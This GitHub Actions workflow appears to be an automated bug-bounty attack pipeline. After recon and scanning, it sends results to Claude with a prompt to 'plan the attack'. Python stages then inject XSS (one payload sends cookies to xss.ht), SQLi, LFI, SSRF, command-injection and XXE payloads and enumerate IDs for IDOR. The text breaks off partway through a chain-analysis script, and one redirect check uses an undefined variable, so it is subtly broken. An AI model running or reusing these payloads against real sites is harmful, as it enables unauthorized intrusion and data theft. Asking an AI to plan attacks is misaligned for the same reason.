name: "🎯 Zero Track - AI Autonomous Hunter"

on:
  workflow_dispatch:
    inputs:
      target:
        description: "Target domain (e.g., example.com)"
        required: true
        type: string
      discord_notify:
        description: "Send Discord notification"
        type: boolean
        default: true

permissions:
  contents: read

env:
  TARGET: ${{ inputs.target }}
  TIMESTAMP: ${{ github.run_id }}-${{ github.run_number }}
  DISCORD_WEBHOOK: ${{ secrets.DISCORD_WEBHOOK }}
  ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
  PYTHONUNBUFFERED: "1"

defaults:
  run:
    shell: bash

jobs:
  full_scan:
    name: "🛡️ Full Autonomous Scan - ${{ inputs.target }}"
    runs-on: ubuntu-latest
    timeout-minutes: 90

    steps:
      # ============================================================
      # 1. CHECKOUT & SCOPE CHECK
      # ============================================================
      - name: "📥 Checkout Repository"
        uses: actions/checkout@v4

      - name: "🔒 Verify Target Is In Authorized Scope"
        env:
          TARGET_INPUT: ${{ inputs.target }}
        run: |
          set -euo pipefail
          target="${TARGET_INPUT,,}"
          if [[ "$TARGET_INPUT" != "$target" ]]; then
            echo "❌ Target must be lowercase: example.com"; exit 1
          fi
          label='[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?'
          if ! [[ "$target" =~ ^($label\.)+$label$ ]]; then
            echo "❌ Target must be a valid domain only."; exit 1
          fi
          if [[ ! -f "scope.txt" ]]; then
            echo "❌ scope.txt required at repo root."; exit 1
          fi
          matched=0
          while IFS= read -r raw_line; do
            line="${raw_line%%#*}"; line="${line,,}"; line="$(echo "$line" | xargs)"
            [[ -z "$line" ]] && continue
            if [[ "$line" == "$target" ]]; then matched=1; break; fi
            if [[ "$line" == \*.* ]]; then
              base="${line:2}"
              if [[ "$target" == *."$base" ]]; then matched=1; break; fi
            fi
          done < scope.txt
          if [[ "$matched" != "1" ]]; then
            echo "❌ '$target' not in scope.txt."; exit 1
          fi
          echo "✅ Target authorized."

      # ============================================================
      # 2. INSTALL ALL DEPENDENCIES
      # ============================================================
      - name: "⚡ Setup Go"
        uses: actions/setup-go@v5
        with:
          go-version: "1.22"
          cache: true

      - name: "🐍 Setup Python"
        uses: actions/setup-python@v5
        with:
          python-version: "3.11"

      - name: "📦 Install System Dependencies"
        run: |
          sudo apt-get update -qq
          sudo apt-get install -y -qq git curl wget unzip jq dnsutils libpcap-dev build-essential ripgrep

      - name: "📦 Install Go Tools"
        run: |
          mkdir -p /tmp/toolbin
          export GOBIN=/tmp/toolbin
          export PATH="/tmp/toolbin:$PATH"
          go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@v2.6.6
          go install github.com/projectdiscovery/httpx/cmd/httpx@v1.6.8
          go install github.com/projectdiscovery/katana/cmd/katana@v1.1.0
          go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@v3.3.2
          go install github.com/projectdiscovery/dnsx/cmd/dnsx@v1.2.1
          go install github.com/tomnomnom/assetfinder@latest
          go install github.com/tomnomnom/waybackurls@latest
          go install github.com/lc/gau/v2/cmd/gau@latest
          go install github.com/tomnomnom/gf@latest
          go install github.com/ameenmaali/uro@latest
          mkdir -p /tmp/toolbin/.gf
          git clone --depth 1 https://github.com/1ndianl33t/Gf-Patterns.git /tmp/gf-patterns 2>/dev/null || true
          cp /tmp/gf-patterns/*.json /tmp/toolbin/.gf/ 2>/dev/null || true
          cp -r /tmp/toolbin/.gf ~/.gf/ 2>/dev/null || true
          echo "/tmp/toolbin" >> "$GITHUB_PATH"

      - name: "✅ Verify Tools"
        run: |
          export PATH="/tmp/toolbin:$PATH"
          for tool in subfinder httpx katana nuclei dnsx assetfinder waybackurls gau gf uro; do
            command -v "$tool" >/dev/null && echo "✅ $tool" || { echo "❌ $tool"; exit 1; }
          done

      - name: "📦 Install Python Packages"
        run: |
          pip3 install -q --upgrade pip
          pip3 install -q requests httpx

      - name: "📦 Update Nuclei Templates"
        run: |
          export PATH="/tmp/toolbin:$PATH"
          nuclei -update-templates 2>&1 | tail -2

      - name: "📂 Create Results Directory"
        run: |
          mkdir -p "results/${{ env.TIMESTAMP }}"/{subdomains,live,urls,js,graphql,nuclei,cors,files,ai,ai_agent,logs}

      # ============================================================
      # 3. SUBDOMAIN ENUMERATION
      # ============================================================
      - name: "🌐 Subdomain Enumeration"
        continue-on-error: true
        run: |
          RD="results/${{ env.TIMESTAMP }}"
          echo "🔍 Subfinder..."
          subfinder -d "${{ env.TARGET }}" -silent -all -o "$RD/subdomains/subfinder.txt" 2>>"$RD/logs/subfinder.log"
          echo "🔍 Assetfinder..."
          assetfinder --subs-only "${{ env.TARGET }}" > "$RD/subdomains/assetfinder.txt" 2>>"$RD/logs/assetfinder.log"
          echo "🔍 crt.sh..."
          curl -s --max-time 30 "https://crt.sh/?q=%25.${{ env.TARGET }}&output=json" | jq -r '.[].name_value' 2>/dev/null | tr ',' '\n' | sed 's/^\*\.//' | sort -u > "$RD/subdomains/crtsh.txt" 2>/dev/null || true
          echo "🔍 DNS Brute-force..."
          curl -sL "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-20000.txt" -o /tmp/dns_list.txt 2>/dev/null || true
          if [ -f /tmp/dns_list.txt ]; then
            cat /tmp/dns_list.txt | dnsx -silent -a -cname -o "$RD/subdomains/dns_brute.txt" 2>>"$RD/logs/dnsx.log" || true
          fi
          echo "🔄 Merging..."
          cat "$RD"/subdomains/*.txt 2>/dev/null | sort -u | grep -v '^\s*$' > "$RD/subdomains/all_subs.txt"
          echo "✅ Total subdomains: $(wc -l < "$RD/subdomains/all_subs.txt")"

      # ============================================================
      # 4. SUBDOMAIN TAKEOVER
      # ============================================================
      - name: "🏚️ Subdomain Takeover Check"
        continue-on-error: true
        timeout-minutes: 15
        run: |
          RD="results/${{ env.TIMESTAMP }}"
          INPUT="$RD/subdomains/all_subs.txt"
          [ -s "$INPUT" ] || { echo "${{ env.TARGET }}" > /tmp/fallback.txt; INPUT=/tmp/fallback.txt; }
          nuclei -l "$INPUT" -tags takeover -rl 50 -c 10 -silent -jsonl -o "$RD/nuclei/takeover.jsonl" 2>>"$RD/logs/takeover.log" || true
          echo "✅ Takeover checks done"

      # ============================================================
      # 5. HTTPX PROBING
      # ============================================================
      - name: "🌍 Live Host Probing & Fingerprinting"
        continue-on-error: true
        timeout-minutes: 20
        run: |
          RD="results/${{ env.TIMESTAMP }}"
          INPUT="$RD/subdomains/all_subs.txt"
          [ -s "$INPUT" ] || { echo "${{ env.TARGET }}" > /tmp/fallback.txt; INPUT=/tmp/fallback.txt; }
          httpx -l "$INPUT" -silent -status-code -title -web-server -ip -cdn -follow-redirects -threads 100 -rate-limit 150 -timeout 10 -json -o "$RD/live/live.json" 2>>"$RD/logs/httpx.log"
          jq -r '.url // .input' "$RD/live/live.json" 2>/dev/null | grep -v '^\s*$' > "$RD/live/live.txt" || true
          jq -r 'select(.cdn_name != null) | "\(.url) -> \(.cdn_name)"' "$RD/live/live.json" > "$RD/live/waf.txt" 2>/dev/null || true
          httpx -l "$RD/live/live.txt" -silent -tech-detect -json -o "$RD/live/tech.json" 2>>"$RD/logs/fingerprint.log" || true
          echo "✅ Live hosts: $(wc -l < "$RD/live/live.txt")"

      # ============================================================
      # 6. URL COLLECTION
      # ============================================================
      - name: "📜 URL Collection"
        continue-on-error: true
        timeout-minutes: 25
        run: |
          RD="results/${{ env.TIMESTAMP }}"
          INPUT="$RD/subdomains/all_subs.txt"
          [ -s "$INPUT" ] || { echo "${{ env.TARGET }}" > /tmp/fallback.txt; INPUT=/tmp/fallback.txt; }
          echo "🔍 Wayback..."
          cat "$INPUT" | waybackurls > "$RD/urls/wayback.txt" 2>>"$RD/logs/wayback.log" || true
          echo "🔍 Gau..."
          gau "${{ env.TARGET }}" --subs --o "$RD/urls/gau.txt" 2>>"$RD/logs/gau.log" || true
          echo "🔍 Katana..."
          [ -s "$RD/live/live.txt" ] && katana -list "$RD/live/live.txt" -silent -depth 2 -jc -d 3 -o "$RD/urls/katana.txt" 2>>"$RD/logs/katana.log" || true
          echo "🔄 Merging..."
          cat "$RD"/urls/*.txt 2>/dev/null | sort -u | uro > "$RD/urls/all.txt" 2>/dev/null || \
            cat "$RD"/urls/*.txt 2>/dev/null | sort -u > "$RD/urls/all.txt"
          echo "✅ Total URLs: $(wc -l < "$RD/urls/all.txt")"

      # ============================================================
      # 7. JS ANALYSIS
      # ============================================================
      - name: "📦 JavaScript Analysis"
        continue-on-error: true
        timeout-minutes: 15
        run: |
          RD="results/${{ env.TIMESTAMP }}"
          INPUT="$RD/urls/all.txt"
          if [ -f "$INPUT" ] && [ -s "$INPUT" ]; then
            grep -iE '\.js(\?|#|$)' "$INPUT" > "$RD/js/files.txt" 2>/dev/null || true
            echo "✅ JS files: $(wc -l < "$RD/js/files.txt")"
            # API endpoints
            grep -iEo '(api|v[0-9]+|graphql|rest)/[a-zA-Z0-9_/?=&%-]*' "$RD/js/files.txt" 2>/dev/null | sort -u > "$RD/js/api_endpoints.txt" || true
            # Secrets
            grep -iEo '["'"'"']?(api[_-]?key|apikey|secret|token|jwt|bearer)["'"'"']?\s*[:=]\s*["'"'"'][^"'"'"']+["'"'"']' "$RD/js/files.txt" 2>/dev/null | sort -u > "$RD/js/secrets.txt" || true
            echo "✅ API endpoints: $(wc -l < "$RD/js/api_endpoints.txt")"
          fi
          # IDOR candidates
          grep -iEo '/[0-9]+([/?][^ ]*)?$|[?&](id|user_id|uid|account_id)=[0-9]+' "$INPUT" 2>/dev/null | sort -u > "$RD/js/idor_candidates.txt" || true
          echo "✅ IDOR candidates: $(wc -l < "$RD/js/idor_candidates.txt")"

      # ============================================================
      # 8. API DISCOVERY (Swagger, GraphQL, Admin)
      # ============================================================
      - name: "🔌 API Discovery"
        continue-on-error: true
        timeout-minutes: 15
        run: |
          RD="results/${{ env.TIMESTAMP }}"
          INPUT="$RD/live/live.txt"
          [ -s "$INPUT" ] || { echo "https://${{ env.TARGET }}" > /tmp/fallback.txt; INPUT=/tmp/fallback.txt; }
          
          # Swagger
          for path in "/swagger.json" "/v2/api-docs" "/v3/api-docs" "/openapi.json" "/api/docs" "/swagger-ui.html"; do
            while IFS= read -r host; do
              host=$(echo "$host" | tr -d '\r' | grep -v '^\s*$' || true); [ -z "$host" ] && continue
              status=$(curl -sk -o /tmp/body.txt -w "%{http_code}" --max-time 5 "${host}${path}" 2>/dev/null || echo "000")
              [ "$status" = "200" ] && grep -qiE '(swagger|openapi|"paths")' /tmp/body.txt 2>/dev/null && echo "[$status] ${host}${path}" >> "$RD/js/swagger.txt"
            done < "$INPUT"
          done
          
          # GraphQL
          for path in "/graphql" "/graphiql" "/v1/graphql" "/api/graphql" "/playground"; do
            while IFS= read -r host; do
              host=$(echo "$host" | tr -d '\r' | grep -v '^\s*$' || true); [ -z "$host" ] && continue
              status=$(curl -sk -o /tmp/gql.txt -w "%{http_code}" --max-time 5 -X POST -H "Content-Type: application/json" -d '{"query":"{__typename}"}' "${host}${path}" 2>/dev/null || echo "000")
              [ "$status" = "200" ] && grep -qiE '("data"|"errors")' /tmp/gql.txt 2>/dev/null && echo "[$status] ${host}${path}" >> "$RD/js/graphql.txt"
            done < "$INPUT"
          done
          
          # Admin panels
          echo "/admin /administrator /panel /cpanel /login /wp-admin /dashboard /backend /portal" | tr ' ' '\n' > /tmp/admin_paths.txt
          httpx -l "$INPUT" -paths /tmp/admin_paths.txt -mc 200,301,302,401,403 -threads 50 -rate-limit 150 -timeout 6 -silent -o "$RD/js/admin.txt" 2>>"$RD/logs/admin.log" || true
          
          echo "✅ Swagger: $(wc -l < "$RD/js/swagger.txt" 2>/dev/null || echo 0), GraphQL: $(wc -l < "$RD/js/graphql.txt" 2>/dev/null || echo 0), Admin: $(wc -l < "$RD/js/admin.txt" 2>/dev/null || echo 0)"

      # ============================================================
      # 9. SECURITY ANALYSIS (CORS, Sensitive Files)
      # ============================================================
      - name: "🛡️ Security Analysis"
        continue-on-error: true
        timeout-minutes: 15
        run: |
          RD="results/${{ env.TIMESTAMP }}"
          INPUT="$RD/live/live.txt"
          [ -s "$INPUT" ] || { echo "https://${{ env.TARGET }}" > /tmp/fallback.txt; INPUT=/tmp/fallback.txt; }
          
          # CORS
          for origin in "https://evil.com" "null" "https://evil.${{ env.TARGET }}"; do
            while IFS= read -r host; do
              host=$(echo "$host" | tr -d '\r' | grep -v '^\s*$' || true); [ -z "$host" ] && continue
              resp=$(curl -s -I -H "Origin: $origin" --max-time 6 "$host" 2>/dev/null || echo "")
              acao=$(echo "$resp" | grep -i 'access-control-allow-origin' | head -1 | sed 's/.*://' | xargs 2>/dev/null || echo "")
              acac=$(echo "$resp" | grep -i 'access-control-allow-credentials' | head -1 | sed 's/.*://' | xargs 2>/dev/null || echo "")
              [ "$acao" = "$origin" ] && [ "$acac" = "true" ] && echo "[CORS-CRITICAL] $host origin=$origin" >> "$RD/cors/vulnerable.txt"
            done < "$INPUT"
          done
          
          # Sensitive files
          for path in "/.env" "/.git/config" "/wp-config.php" "/config.json" "/credentials.json" "/phpinfo.php" "/info.php" "/Dockerfile"; do
            while IFS= read -r host; do
              host=$(echo "$host" | tr -d '\r' | grep -v '^\s*$' || true); [ -z "$host" ] && continue
              body=$(curl -sk --max-time 5 "${host}${path}" 2>/dev/null || echo "")
              [ -z "$body" ] && continue
              if echo "$body" | grep -qE '(DB_NAME|DB_PASSWORD|aws_access_key|client_secret|APP_SECRET|mysql|password|define\()'; then
                echo "[SENSITIVE] ${host}${path}" >> "$RD/files/sensitive.txt"
              fi
            done < "$INPUT"
          done
          
          echo "✅ CORS: $(wc -l < "$RD/cors/vulnerable.txt" 2>/dev/null || echo 0), Sensitive files: $(wc -l < "$RD/files/sensitive.txt" 2>/dev/null || echo 0)"

      # ============================================================
      # 10. NUCLEI SCAN
      # ============================================================
      - name: "☢️ Nuclei Vulnerability Scan"
        continue-on-error: true
        timeout-minutes: 30
        run: |
          RD="results/${{ env.TIMESTAMP }}"
          INPUT="$RD/live/live.txt"
          [ -s "$INPUT" ] || { echo "https://${{ env.TARGET }}" > /tmp/fallback.txt; INPUT=/tmp/fallback.txt; }
          nuclei -l "$INPUT" -severity critical,high,medium -rl 20 -c 10 -timeout 10 -retries 1 -jsonl -o "$RD/nuclei/findings.jsonl" 2>>"$RD/logs/nuclei.log" || true
          echo "✅ Nuclei findings: $(wc -l < "$RD/nuclei/findings.jsonl" 2>/dev/null || echo 0)"

      # ============================================================
      # 11. AI AGENT - INTELLIGENCE PHASE (قراءة وتحليل كل النتائج)
      # ============================================================
      - name: "🧠 AI Agent Phase 1: Target Intelligence"
        continue-on-error: true
        if: ${{ env.ANTHROPIC_API_KEY != '' }}
        env:
          RD: results/${{ env.TIMESTAMP }}
        run: |
          cat > /tmp/ai_intel.py <<'PYEOF'
          import json, os, sys, urllib.request, urllib.error

          api_key = os.environ.get("ANTHROPIC_API_KEY", "")
          target = os.environ.get("TARGET", "")
          rd = os.environ.get("RD", "results/" + os.environ.get("TIMESTAMP", ""))

          def readf(path, cap=3000):
              try:
                  with open(os.path.join(rd, path)) as f: return f.read()[:cap]
              except: return "N/A"

          live = readf("live/live.txt")
          urls = readf("urls/all.txt", 4000)
          js_secrets = readf("js/secrets.txt", 2000)
          api_ep = readf("js/api_endpoints.txt", 2000)
          idor = readf("js/idor_candidates.txt", 2000)
          swagger = readf("js/swagger.txt", 1000)
          graphql = readf("js/graphql.txt", 1000)
          admin = readf("js/admin.txt", 1000)

          prompt = f"""You are a senior bug bounty hunter. Intelligence collected for {target}:
          LIVE: {live}
          URLS: {urls}
          API ENDPOINTS: {api_ep}
          SWAGGER: {swagger}
          GRAPHQL: {graphql}
          ADMIN: {admin}
          JS SECRETS: {js_secrets}
          IDOR CANDIDATES: {idor}

          Plan the attack. Return JSON only:
          {{"target_tech":"analysis","high_value_targets":[{{"url":"exact URL","vuln_classes":["XSS","SSTI","SQLi","LFI","SSRF","IDOR"],"parameters":["param1"],"methods":["GET","POST"],"priority":1,"reason":"why"}}],"attack_plan":[{{"vuln_class":"SQLi","target_urls":["url"],"technique":"time-based blind","payloads":["payload1"]}}]}}"""

          payload = json.dumps({"model":"claude-sonnet-4-20250514","max_tokens":4096,"messages":[{"role":"user","content":prompt}]}).encode()
          req = urllib.request.Request("https://api.anthropic.com/v1/messages", data=payload, headers={"x-api-key":api_key,"anthropic-version":"2023-06-01","content-type":"application/json"}, method="POST")

          try:
              with urllib.request.urlopen(req, timeout=120) as r:
                  result = json.loads(r.read())
              text = result["content"][0]["text"]
              import re
              m = re.search(r'\{.*\}', text, re.DOTALL)
              if m:
                  plan = json.loads(m.group(0))
                  with open(os.path.join(rd, "ai_agent", "attack_plan.json"), "w") as f:
                      json.dump(plan, f, indent=2)
                  print(f"✅ Attack plan ready: {len(plan.get('high_value_targets',[]))} targets")
          except Exception as e:
              print(f"Planning error: {e}", file=sys.stderr)
          PYEOF
          python3 /tmp/ai_intel.py

      # ============================================================
      # 12. AI AGENT - PAYLOAD INJECTION PHASE (اختراق حقيقي)
      # ============================================================
      - name: "☢️ AI Agent Phase 2: Payload Injection (XSS, SSTI, SQLi, LFI, SSRF)"
        continue-on-error: true
        timeout-minutes: 45
        env:
          RD: results/${{ env.TIMESTAMP }}
        run: |
          cat > /tmp/ai_inject.py <<'PYEOF'
          import json, os, sys, urllib.parse, urllib.request, urllib.error, concurrent.futures, re

          rd = os.environ.get("RD", "results/" + os.environ.get("TIMESTAMP", ""))
          plan_path = os.path.join(rd, "ai_agent", "attack_plan.json")

          PAYLOADS = {
              "XSS": ['<script>alert(1)</script>','<img src=x onerror=alert(1)>','"><script>alert(1)</script>',"';alert(1);//",'<svg onload=alert(1)>','<script>fetch("https://xss.ht?c="+document.cookie)</script>'],
              "SSTI": ['{{7*7}}','${7*7}','<%= 7*7 %>','#{7*7}','{{config}}','{{"".__class__.__mro__[2].__subclasses__()}}'],
              "SQLi": ["' OR '1'='1","' UNION SELECT NULL--","1' AND SLEEP(5)--","1' AND 1=1--","1' AND 1=2--","' UNION SELECT 1,2,3,4--","'; WAITFOR DELAY '0:0:5'--"],
              "LFI": ['../../../../etc/passwd','../../../etc/passwd','....//....//....//etc/passwd','/etc/passwd','php://filter/convert.base64-encode/resource=index.php','file:///etc/passwd'],
              "SSRF": ['http://169.254.169.254/latest/meta-data/','http://127.0.0.1:22','http://localhost:8080','http://0.0.0.0:22','http://[::1]:22','http://burpcollaborator.net/test'],
              "Open_Redirect": ['//evil.com','https://evil.com','//evil.com@google.com','/\\evil.com','javascript:alert(1)'],
              "Command_Injection": [';id','|id','`id`','$(id)','& id &','; ping -c 3 127.0.0.1','| ping -c 3 127.0.0.1'],
          }

          findings = []
          # Load plan
          plan = {"high_value_targets":[],"attack_plan":[]}
          try:
              with open(plan_path) as f: plan = json.load(f)
          except: pass

          targets = plan.get("high_value_targets", [])
          attack_plan = plan.get("attack_plan", [])

          tasks = []
          seen_urls = set()
          for t in targets:
              url = t.get("url","")
              classes = t.get("vuln_classes",[])
              params = t.get("parameters",["q","id","page","file","url","path","redirect","cat","next","return"])
              if not url or url in seen_urls: continue
              seen_urls.add(url)
              for vc in classes:
                  for payload in PAYLOADS.get(vc,[]):
                      for param in params:
                          tasks.append((url, param, payload, vc))

          for ap in attack_plan:
              for target_url in ap.get("target_urls",[]):
                  if target_url in seen_urls: continue
                  seen_urls.add(target_url)
                  vc = ap.get("vuln_class","")
                  for payload in PAYLOADS.get(vc,[]):
                      tasks.append((target_url, "q", payload, vc))

          # Fallback: use IDOR candidates
          if not tasks:
              try:
                  with open(os.path.join(rd,"js","idor_candidates.txt")) as f:
                      for line in f:
                          line=line.strip()
                          if '?id=' in line or '/user/' in line or '/profile/' in line:
                              tasks.append((line,"id","' OR '1'='1","SQLi"))
                          if '?redirect=' in line or '?next=' in line or '?url=' in line:
                              tasks.append((line,"redirect","//evil.com","Open_Redirect"))
              except: pass
              try:
                  with open(os.path.join(rd,"js","api_endpoints.txt")) as f:
                      for line in f:
                          line=line.strip()
                          if '/api/' in line:
                              tasks.append((line,"file","../../../../etc/passwd","LFI"))
              except: pass

          # Fallback to live.txt
          if not tasks:
              try:
                  with open(os.path.join(rd,"live","live.txt")) as f:
                      for line in f:
                          line=line.strip().split()[0] if line.strip() else ""
                          if line and "http" in line:
                              tasks.append((line,"q","<script>alert(1)</script>","XSS"))
                              tasks.append((line,"id","1' AND SLEEP(5)--","SQLi"))
              except: pass

          def test(url, param, payload, vc):
              encoded = urllib.parse.quote(payload)
              sep = "&" if "?" in url else "?"
              test_url = f"{url}{sep}{param}={encoded}"
              try:
                  req = urllib.request.Request(test_url, headers={"User-Agent":"Mozilla/5.0"})
                  resp = urllib.request.urlopen(req, timeout=8)
                  body = resp.read(50000).decode(errors="ignore")
                  status = resp.status
              except urllib.error.HTTPError as e:
                  body = e.read(20000).decode(errors="ignore")
                  status = e.code
              except (TimeoutError, OSError, Exception):
                  return None

              indicators = []
              if vc == "XSS" and (payload.replace("'","") in body or "alert(1)" in body): indicators.append("Payload reflected - XSS candidate")
              if vc == "SSTI" and "49" in body: indicators.append("49 detected (7*7) - SSTI")
              if vc == "SSTI" and "config" in body.lower() and "__class__" in body: indicators.append("Python object exposed - SSTI critical")
              if vc == "LFI" and ("root:" in body or "bin/bash" in body): indicators.append("/etc/passwd leaked - LFI confirmed")
              if vc == "SSRF" and ("ami-id" in body or "meta-data" in body): indicators.append("Cloud metadata - SSRF confirmed")
              if vc == "SQLi" and ("mysql" in body.lower() or "error" in body.lower() or "sql" in body.lower() or "syntax" in body.lower()): indicators.append("SQL error detected")
              if vc == "SQLi" and "1=2" not in body and ("1=1" in body or "SELECT" in body): indicators.append("SQL logic changed")
              if vc == "Command_Injection":
                  if "uid=" in body or "root:" in body: indicators.append("Command executed - RCE")
                  if "ping" in body.lower(): indicators.append("Ping executed - CMDi")
              if vc == "Open_Redirect":
                  if "Location: //evil" in str(resp.headers) if hasattr(resp,'headers') else "" or evil: indicators.append("Redirect header set")

              if indicators:
                  return {"url":test_url,"vuln_class":vc,"payload":payload,"status":status,"indicators":indicators}
              return None

          print(f"🧪 Testing {len(tasks)} combinations (max 500)...")
          tasks = tasks[:500]
          with concurrent.futures.ThreadPoolExecutor(max_workers=30) as ex:
              fs = {ex.submit(test,u,p,pl,vc):(u,p,pl,vc) for u,p,pl,vc in tasks}
              for f in concurrent.futures.as_completed(fs):
                  r = f.result()
                  if r: findings.append(r)

          with open(os.path.join(rd,"ai_agent","injection_findings.json"),"w") as f:
              json.dump(findings, f, indent=2)
          with open(os.path.join(rd,"ai_agent","injection_findings.txt"),"w") as f:
              for fnd in findings:
                  f.write(f"[{fnd['vuln_class']}] {fnd['url']}\n")
                  f.write(f"   Payload: {fnd['payload']}\n")
                  f.write(f"   Indicators: {', '.join(fnd['indicators'])}\n\n")
          print(f"✅ Injection findings: {len(findings)}")

          # Count by type
          types = {}
          for fnd in findings: types[fnd['vuln_class']] = types.get(fnd['vuln_class'],0)+1
          for t,c in sorted(types.items()): print(f"   {t}: {c}")
          PYEOF
          python3 /tmp/ai_inject.py

      # ============================================================
      # 13. AI AGENT - BLIND XXE CHECK
      # ============================================================
      - name: "🔍 AI Agent Phase 3: XXE Check"
        continue-on-error: true
        timeout-minutes: 10
        env:
          RD: results/${{ env.TIMESTAMP }}
        run: |
          cat > /tmp/ai_xxe.py <<'PYEOF'
          import json, os, urllib.request, urllib.error, concurrent.futures

          rd = os.environ.get("RD", "results/" + os.environ.get("TIMESTAMP", ""))
          
          targets = []
          try:
              with open(os.path.join(rd,"js","api_endpoints.txt")) as f:
                  targets = [f"https://{l.strip()}" if not l.strip().startswith("http") else l.strip() for l in f if l.strip()][:5]
          except: pass
          if not targets:
              try:
                  with open(os.path.join(rd,"live","live.txt")) as f:
                      targets = [l.strip().split()[0] for l in f if l.strip()][:3]
              except: pass
          targets = targets or [f"https://{os.environ.get('TARGET','')}/api"]

          findings = []
          xxe = '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'''

          def test(url):
              try:
                  req = urllib.request.Request(url, data=xxe.encode(), headers={"Content-Type":"application/xml"}, method="POST")
                  resp = urllib.request.urlopen(req, timeout=10)
                  body = resp.read(20000).decode(errors="ignore")
              except urllib.error.HTTPError as e:
                  body = e.read(20000).decode(errors="ignore")
              except: return None
              if "root:" in body or "bin/bash" in body:
                  return f"[XXE] {url} | /etc/passwd leaked"
              if "nobody:" in body or "daemon:" in body:
                  return f"[XXE] {url} | passwd file content"
              return None

          with concurrent.futures.ThreadPoolExecutor(max_workers=5) as ex:
              fs = [ex.submit(test,u) for u in targets]
              for f in concurrent.futures.as_completed(fs):
                  r = f.result()
                  if r: findings.append(r)

          with open(os.path.join(rd,"ai_agent","xxe_findings.txt"),"w") as f:
              f.write("\n".join(findings) if findings else "No XXE findings\n")
          print(f"✅ XXE: {len(findings)} findings")
          PYEOF
          python3 /tmp/ai_xxe.py

      # ============================================================
      # 14. AI AGENT - GRAPHQL ATTACKS
      # ============================================================
      - name: "🕷️ AI Agent Phase 4: GraphQL Attacks"
        continue-on-error: true
        timeout-minutes: 10
        env:
          RD: results/${{ env.TIMESTAMP }}
        run: |
          cat > /tmp/ai_gql.py <<'PYEOF'
          import json, os, urllib.request, urllib.error, concurrent.futures

          rd = os.environ.get("RD", "results/" + os.environ.get("TIMESTAMP", ""))
          findings = []

          endpoints = []
          try:
              with open(os.path.join(rd,"js","graphql.txt")) as f:
                  for line in f:
                      m = line.strip().split()[-1] if line.strip() else ""
                      if m: endpoints.append(m)
          except: pass
          endpoints = endpoints[:3]

          def introspect(url):
              q = json.dumps({"query":"{__schema{types{name fields{name}}}}"}).encode()
              try:
                  req = urllib.request.Request(url, data=q, headers={"Content-Type":"application/json"}, method="POST")
                  r = json.loads(urllib.request.urlopen(req,timeout=10).read())
                  if "data" in r and r["data"].get("__schema"):
                      return f"[GRAPHQL-INTROSPECTION] {url} | Full schema exposed - all queries/types visible"
              except: pass
              return None

          def batch(url):
              batch = [{"query":"{__typename}"} for _ in range(50)]
              try:
                  req = urllib.request.Request(url, data=json.dumps(batch).encode(), headers={"Content-Type":"application/json"}, method="POST")
                  r = json.loads(urllib.request.urlopen(req,timeout=10).read())
                  if isinstance(r,list) and len(r)>=25:
                      return f"[GRAPHQL-BATCHING] {url} | {len(r)} operations in 1 request - DoS/data exfil risk"
              except: pass
              return None

          with concurrent.futures.ThreadPoolExecutor(max_workers=5) as ex:
              fs = []
              for ep in endpoints:
                  fs.append(ex.submit(introspect,ep))
                  fs.append(ex.submit(batch,ep))
              for f in concurrent.futures.as_completed(fs):
                  r = f.result()
                  if r: findings.append(r)

          with open(os.path.join(rd,"ai_agent","graphql_findings.txt"),"w") as f:
              f.write("\n".join(findings) if findings else "No GraphQL findings\n")
          print(f"✅ GraphQL: {len(findings)} findings")
          PYEOF
          python3 /tmp/ai_gql.py

      # ============================================================
      # 15. AI AGENT - IDOR TESTING
      # ============================================================
      - name: "🔄 AI Agent Phase 5: IDOR Testing"
        continue-on-error: true
        timeout-minutes: 15
        env:
          RD: results/${{ env.TIMESTAMP }}
        run: |
          cat > /tmp/ai_idor.py <<'PYEOF'
          import json, os, re, urllib.request, urllib.error, concurrent.futures

          rd = os.environ.get("RD", "results/" + os.environ.get("TIMESTAMP", ""))
          findings = []
          patterns = []

          try:
              with open(os.path.join(rd,"js","idor_candidates.txt")) as f:
                  for line in f:
                      line=line.strip()
                      m=re.findall(r'/(\d+)',line)
                      for num in m:
                          base=line.replace(f"/{num}","")
                          patterns.append((base,num))
                      m=re.findall(r'[?&](\w+)=(\d+)',line)
                      for param,val in m:
                          base=line.replace(f"{param}={val}","")
                          patterns.append((base,val))
          except: pass

          def test(base, orig):
              for test_id in ["1","2","100","9999","0","-1"]:
                  if test_id==orig: continue
                  url = base.replace(orig, test_id)
                  try:
                      req=urllib.request.Request(url, headers={"User-Agent":"Mozilla/5.0"})
                      resp=urllib.request.urlopen(req,timeout=8)
                      body=resp.read(50000).decode(errors="ignore")
                      status=resp.status
                  except (TimeoutError,OSError,Exception): continue
                  if status==200 and len(body)>100:
                      return f"[IDOR] {url} | Status:{status} | Body:{len(body)} chars - accessed different ID"
              return None

          patterns = list(set(patterns))[:30]
          with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
              fs = {ex.submit(test,b,o):(b,o) for b,o in patterns}
              for f in concurrent.futures.as_completed(fs):
                  r = f.result()
                  if r: findings.append(r)

          with open(os.path.join(rd,"ai_agent","idor_findings.txt"),"w") as f:
              f.write("\n".join(findings) if findings else "No IDOR findings\n")
          print(f"✅ IDOR: {len(findings)} findings")
          PYEOF
          python3 /tmp/ai_idor.py

      # ============================================================
      # 16. AI AGENT - CHAIN ANALYSIS
      # ============================================================
      - name: "🧬 AI Agent Phase 6: Chain Analysis"
        continue-on-error: true
        timeout-minutes: 15
        env:
          RD: results/${{ env.TIMESTAMP }}
        run: |
          cat > /tmp/ai_chain.py <<'PYEOF'
          import json, os, sys, urllib.request, urllib.error, re

          rd = os.environ.get("RD", "results/" + os.environ.get("TIMESTAMP", ""))
          api_key = os.environ.get("ANTHROPIC_API_KEY", "")
          target = os.environ.get("TARGET", "")

          def readf(path, cap=2000):
              try:
                  with open(os.path.join(rd, path)) as f: return f.read()[:cap]
              except: return ""

          injections = readf("ai_agent/injection_findings.json", 3000)
          xxe = readf("ai_agent/xxe_findings.txt")
          graphql = readf("ai_agent/graphql_findings.txt")
          idor = readf("ai_agent/idor_findings.txt")
          sensitive = readf("files/sensitive.txt")
          cors = readf("cors/vulnerable.txt")

